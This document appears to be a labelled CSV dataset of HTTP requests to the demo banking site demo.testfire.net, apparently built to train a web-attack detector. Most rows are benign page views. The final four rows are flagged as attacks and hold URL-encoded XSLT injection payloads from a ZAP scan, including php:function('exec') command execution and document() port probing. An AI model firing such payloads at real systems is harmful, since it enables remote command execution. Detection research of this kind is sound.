GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/default.jsp?content=security.htm,,0,0,0,0,0,0,0,0,0,33,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 33, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/swagger/index.html,,0,0,0,0,0,0,0,0,0,19,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 19, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/search.jsp?query=,,0,0,0,0,0,0,0,0,0,18,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 18, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/search.jsp?query=882901,,0,0,0,0,0,0,0,0,0,24,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 24, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/feedback.jsp,,0,0,0,0,0,0,0,0,0,13,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 13, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/index.jsp?content=personal_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/index.jsp?content=business_retirement.htm,,0,0,0,0,0,0,0,0,0,42,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 42, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/survey_questions.jsp,,0,0,0,0,0,0,0,0,0,21,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 21, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/status_check.jsp,,0,0,0,0,0,0,0,0,0,17,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 17, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,0,0,0,29,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 29, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/subscribe.jsp,,0,0,0,0,0,0,0,0,0,14,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 14, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/index.jsp?content=inside_about.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 35, 3, 0]",0
GET,/login.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/subscribe.jsp,,0,0,0,0,0,0,0,0,0,14,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 14, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/index.jsp?content=inside_press.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 35, 3, 0]",0
GET,/index.jsp?content=inside_contact.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/disclaimer.htm?url=http%3a%2f%2fwww.netscape.com,,0,0,0,0,0,0,0,0,0,43,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 43, 3, 0]",0
GET,/disclaimer.htm?url=http%3a%2f%2fwww.netscape.com,,0,0,0,0,0,0,0,0,0,43,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 43, 3, 0]",0
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,0,0,0,29,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 29, 3, 0]",0
GET,/index.jsp?content=inside_community.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/index.jsp?content=inside_volunteering.htm,,0,0,0,0,0,0,0,0,0,42,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 42, 3, 0]",0
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,0,0,0,29,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 29, 3, 0]",0
GET,/index.jsp?content=inside_community.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/pr/communityannualreport.pdf,,0,0,0,0,0,0,0,0,0,29,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 29, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/default.jsp,,0,0,0,0,0,0,0,0,0,12,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 12, 3, 0]",0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=inside_jobs.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 34, 3, 0]",0
GET,/index.jsp?content=inside_jobs.htm&job=ExecutiveAssistant%3aAdministration,,0,0,0,0,0,0,0,0,0,72,0,1,0,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 72, 3, 0]",0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=inside_jobs.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 34, 3, 0]",0
GET,/index.jsp?content=inside_jobs.htm&job=Teller%3aConsumaerBanking,,0,0,0,0,0,0,0,0,0,62,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 62, 3, 0]",0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=inside_jobs.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 34, 3, 0]",0
GET,/index.jsp?content=inside_jobs.htm&job=CustomerServiceRepresentative%3aCustomerService,,0,0,0,0,0,0,0,0,0,84,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 84, 3, 0]",1
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=inside_jobs.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 34, 3, 0]",0
GET,/index.jsp?content=inside_jobs.htm&job=LoyaltyMarketingProgramManager%3aMarketing,,0,0,0,0,0,0,0,0,0,79,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 79, 3, 0]",0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=inside_jobs.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 34, 3, 0]",0
GET,/index.jsp?content=inside_jobs.htm&job=OperationalRiskManager%3aRiskManagement,,0,0,0,0,0,0,0,0,0,76,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 76, 3, 0]",0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=inside_jobs.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 34, 3, 0]",0
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3aSales,,0,0,0,0,0,0,0,0,0,76,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 76, 3, 0]",0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=inside_internships.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=inside_jobs.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 34, 3, 0]",0
GET,/survey_questions.jsp,,0,0,0,0,0,0,0,0,0,21,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 21, 3, 0]",0
GET,/survey_questions.jsp?step=a,,0,0,0,0,0,0,0,0,0,28,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 28, 3, 0]",0
GET,/survey_questions.jsp?step=b,,0,0,0,0,0,0,0,0,0,28,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 28, 3, 0]",0
GET,/index.jsp?content=inside_contact.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/disclaimer.htm?url=http%3a%2f%2fwww.microsoft.com,,0,0,0,0,0,0,0,0,0,44,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 44, 3, 0]",0
GET,/disclaimer.htm?url=http%3a%2f%2fwww.microsoft.com,,0,0,0,0,0,0,0,0,0,44,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 44, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=personal.htm,,0,0,0,0,0,0,0,0,0,31,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 31, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=business.htm,,0,0,0,0,0,0,0,0,0,31,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 31, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=personal_checking.htm,,0,0,0,0,0,0,0,0,0,40,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 40, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=personal_loans.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=personal_cards.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=personal_investments.htm,,0,0,0,0,0,0,0,0,0,43,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 43, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=personal_other.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=business_lending.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/cgi.exe,,0,0,0,0,0,0,0,0,0,8,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=inside_investor.htm,,0,0,0,0,0,0,0,0,0,38,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 38, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/security.htm,,0,0,0,0,0,0,0,0,0,13,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 13, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/login.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/feedback.jsp,,0,0,0,0,0,0,0,0,0,13,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 13, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=personal_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=business_cards.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=business_retirement.htm,,0,0,0,0,0,0,0,0,0,42,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 42, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=business_other.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=inside_contact.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=inside_about.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 35, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,0,0,0,29,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 29, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=inside_press.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 35, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
POST,/doLogin,uid=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fdemo.testfire.net%3A22%27%29%22%2F%3E&passw=ZAP&btnSubmit=Login,2,2,0,1,1,0,0,2,0,8,94,2,1,"[2, 2, 0, 1, 1, 15, 0, 2, 2, 8, 94, 0]",1
GET,/disclaimer.htm?url=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,,4,2,0,1,2,0,1,3,0,94,0,1,1,"[4, 2, 0, 1, 2, 18, 1, 3, 1, 94, 3, 0]",1
GET,/default.jsp?content=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,,4,2,0,1,2,0,1,3,0,95,0,1,1,"[4, 2, 0, 1, 2, 18, 1, 3, 1, 95, 3, 0]",1
POST,/doSubscribe,txtEmail=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fdemo.testfire.net%3A22%27%29%22%2F%3E&btnSubmit=Subscribe,2,2,0,1,1,0,0,2,0,12,93,1,1,"[2, 2, 0, 1, 1, 15, 0, 2, 1, 12, 93, 0]",1
